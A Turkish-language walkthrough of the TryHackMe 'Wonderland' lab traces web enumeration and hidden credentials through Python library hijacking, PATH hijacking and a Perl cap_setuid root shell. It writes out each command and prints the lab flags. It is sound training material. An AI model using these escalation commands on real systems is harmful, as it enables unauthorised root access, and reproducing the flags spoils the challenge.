<p align="center">
  <img src="images/wonderland.png" width="850">
</p>

# Wonderland - TryHackMe Write-Up

## Machine Information

| Category | Value |
|----------|-------|
| Platform | TryHackMe |
| Machine | Wonderland |
| Difficulty | Medium |
| Operating System | Linux |
| Skills Learned | Web Enumeration, SSH, Python Library Hijacking, PATH Hijacking, Linux Capabilities, GTFOBins |

---

# Attack Path

```text
Recon
   │
   ▼
HTTP Enumeration
   │
   ▼
Hidden Directory Discovery
   │
   ▼
HTML Source Disclosure
   │
   ▼
SSH Login (alice)
   │
   ▼
Python Library Hijacking
   │
   ▼
rabbit
   │
   ▼
PATH Hijacking
   │
   ▼
hatter
   │
   ▼
Perl Capability Abuse
   │
   ▼
ROOT
```

---

# Reconnaissance

İlk olarak hedef sistem üzerinde çalışan servisleri belirlemek amacıyla ayrıntılı bir Nmap taraması gerçekleştiriyoruz.

```bash
nmap -sC -sV -T5 10.112.166.114
```

### Scan Result

```text
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu
80/tcp open  http    Golang net/http server

http-title: Follow the white rabbit.
```

Makinede iki servis açık durumda:

- SSH (22)
- HTTP (80)

SSH servisini kullanabilmek için henüz herhangi bir kullanıcı bilgimiz olmadığından öncelikle web uygulamasını incelemeye başlıyoruz.

---

# Web Enumeration

Web sayfasını ziyaret ettiğimizde bizi şu mesaj karşılıyor.

> **Follow the White Rabbit**

Bu ifade aslında makine boyunca devam edecek ipuçlarının ilkidir.

Gizli dizinleri bulabilmek amacıyla FFUF kullanıyoruz.

```bash
ffuf -w /usr/share/wordlists/dirb/big.txt \
-u http://10.112.166.114/FUZZ \
-fc 404 \
-e .php,.html,.txt,.bak \
-t 100
```

### Discovered Directories

```
/img
/index.html
/poem
/r
```

---

## /poem

Bu dizin içerisinde yalnızca "The Jabberwocky" şiiri bulunmaktadır.

İlk bakışta önemli görünmese de Wonderland temasını destekleyen bir ipucu niteliğindedir.

---

## /r

Bu dizin ise daha ilgi çekicidir.

Sayfa içerisinde şu mesaj yer almaktadır.

> Keep Going.

Ana sayfadaki

> Follow the White Rabbit

ipucuyla birlikte düşünüldüğünde URL yapısının

```
r
ra
rab
rabb
rabbi
rabbit
```

şeklinde ilerlemesi gerektiği anlaşılmaktadır.

Son URL:

```
http://IP/r/a/b/b/i/t/
```

---

# Credential Discovery

Son dizine ulaştığımızda sayfanın kaynak kodunu inceliyoruz.

```html
<p style="display:none;">
alice:HowDothTheLittleCrocodileImproveHisShiningTail
</p>
```

HTML içerisine gizlenmiş kullanıcı bilgileri elde edilmiş oluyor.

```
Username : alice
Password : HowDothTheLittleCrocodileImproveHisShiningTail
```

---

# Initial Access

Bulduğumuz kullanıcı bilgileri ile SSH bağlantısı kuruyoruz.

```bash
ssh alice@IP
```

Parolayı girdikten sonra sisteme başarıyla erişim sağlıyoruz.

```
alice@wonderland:~$
```

İlk erişim tamamlandı.

---

# Privilege Escalation (alice → rabbit)

İlk iş olarak sudo yetkilerini kontrol ediyoruz.

```bash
sudo -l
```

```
User alice may run the following commands:

(rabbit)
/usr/bin/python3.6
/home/alice/walrus_and_the_carpenter.py
```

Alice kullanıcısı belirtilen Python dosyasını rabbit yetkisiyle çalıştırabilmektedir.

---

## Source Code Analysis

Script incelendiğinde şu satır dikkat çekmektedir.

```python
import random
```

Python modülleri yüklerken önce mevcut çalışma dizinine bakmaktadır.

```
sys.path

['',
 '/usr/lib/python36.zip',
 '/usr/lib/python3.6',
 ...
]
```

Listenin başındaki

```
''
```

mevcut dizini ifade eder.

Dolayısıyla aynı dizinde oluşturacağımız

```
random.py
```

dosyası gerçek Python modülünden önce yüklenecektir.

Bu durum **Python Library Hijacking** zafiyetidir.

---

## Exploitation

Kötü amaçlı modül oluşturuyoruz.

```bash
echo 'import os;os.system("/bin/bash -p")' > random.py
```

Ardından scripti sudo ile çalıştırıyoruz.

```bash
sudo -u rabbit /usr/bin/python3.6 \
/home/alice/walrus_and_the_carpenter.py
```

Sonuç:

```bash
rabbit@wonderland:~$
```

Başarıyla rabbit kullanıcısına geçilmiş olur.

---

## Why did this work?

Python modülleri yüklerken önce mevcut çalışma dizinini kontrol ettiği için bizim oluşturduğumuz `random.py`, standart kütüphane yerine çalıştırıldı.

---

# Lateral Movement (rabbit → hatter)

Rabbit kullanıcısının home dizininde dikkat çeken bir binary bulunmaktadır.

```bash
ls -la
```

```
-rwsr-sr-x root root teaParty
```

SUID biti aktif olduğundan detaylı analiz yapılması gerekir.

Program çalıştırıldığında

```
Welcome to the tea party!
...
Segmentation fault
```

çıktısı alınmaktadır.

---

# Static Analysis

Binary kendi makinemize alınarak incelenir.

```bash
strings teaParty
```

Dikkat çeken satır:

```text
/bin/echo -n 'Probably by ' && date --date='next hour' -R
```

Burada

```
echo
```

tam yol ile çağrılırken

```
date
```

komutunun tam yolu belirtilmemiştir.

Bu durum PATH Hijacking ihtimalini göstermektedir.

Objdump analizi sonucunda ayrıca

```
setuid(1003)
```

çağrısı görülmektedir.

1003 UID'si

```
hatter
```

kullanıcısına aittir.

---

# PATH Hijacking

Sahte date oluşturuyoruz.

```bash
mkdir /tmp/x

echo '/bin/bash -p' > /tmp/x/date

chmod +x /tmp/x/date
```

PATH değişkenini değiştiriyoruz.

```bash
export PATH=/tmp/x:$PATH
```

Binary tekrar çalıştırılıyor.

```bash
./teaParty
```

Sonuç

```bash
hatter@wonderland
```

---

## Why did this work?

Program `date` komutunu tam yol belirtmeden çağırdığı için PATH değişkenindeki ilk eşleşme çalıştırıldı ve bizim hazırladığımız sahte binary devreye girdi.

---

# Privilege Escalation (hatter → root)

Capability taraması yapıyoruz.

```bash
getcap -r / 2>/dev/null
```

```
/usr/bin/perl = cap_setuid+ep
/usr/bin/perl5.26.1 = cap_setuid+ep
```

Bu capability sayesinde Perl kendi UID değerini değiştirebilir.

---

## Permission Issue

İlk kontrol sırasında

```bash
id
```

```
uid=1003(hatter)

gid=1002(rabbit)
```

görülmektedir.

TeaParty yalnızca UID değiştirdiğinden grup bilgisi güncellenmemiştir.

Bu nedenle tam kullanıcı geçişi yapılır.

```bash
su hatter
```

Artık

```
uid=1003(hatter)

gid=1003(hatter)
```

olmuştur.

---

# Exploitation

GTFOBins üzerindeki Perl tekniği kullanılmaktadır.

```bash
/usr/bin/perl5.26.1 \
-e 'use POSIX qw(setuid);POSIX::setuid(0);exec "/bin/bash";'
```

Sonuç

```bash
root@wonderland#
```

Makine tamamen ele geçirilmiştir.

---

## Why did this work?

`cap_setuid` yetkisi sayesinde Perl işlemi UID değerini **0 (root)** yapabilmiş ve ardından root yetkileriyle yeni bir Bash kabuğu başlatmıştır.

---

# Flags

```bash
find / -name user.txt 2>/dev/null
```

```
/root/user.txt
```

```bash
cat /root/user.txt
```

```
thm{"Curiouser and curiouser!"}
```

---

```bash
find / -name root.txt 2>/dev/null
```

```
/home/alice/root.txt
```

```bash
cat /home/alice/root.txt
```

```
thm{Twinkle, twinkle, little bat! How I wonder what you’re at!}
```

---

# Lessons Learned

Bu makine aşağıdaki Linux güvenlik konularını pratik olarak göstermektedir.

- Web Enumeration
- FFUF Directory Fuzzing
- Hidden HTML Credentials
- SSH Authentication
- Python Library Hijacking
- Python Module Search Order
- SUID Binary Analysis
- Static Binary Analysis
- PATH Hijacking
- Environment Variables
- Linux Capabilities
- GTFOBins
- UID vs GID Differences
- Linux Privilege Escalation

---

# Tools Used

- Nmap
- FFUF
- SSH
- Strings
- Objdump
- Getcap
- Perl
- GTFOBins

---

# Conclusion

Wonderland, Linux Privilege Escalation tekniklerini öğrenmek isteyenler için oldukça öğretici bir TryHackMe makinesidir. Makine boyunca web keşfi, Python Library Hijacking, PATH Hijacking, Linux Capabilities ve GTFOBins gibi gerçek ortamlarda da karşılaşılabilecek çeşitli zafiyetler kullanılarak root yetkisine ulaşılmıştır.

Bu oda özellikle Linux Privilege Escalation çalışmalarına yeni başlayanlar için kapsamlı bir pratik sunmaktadır.
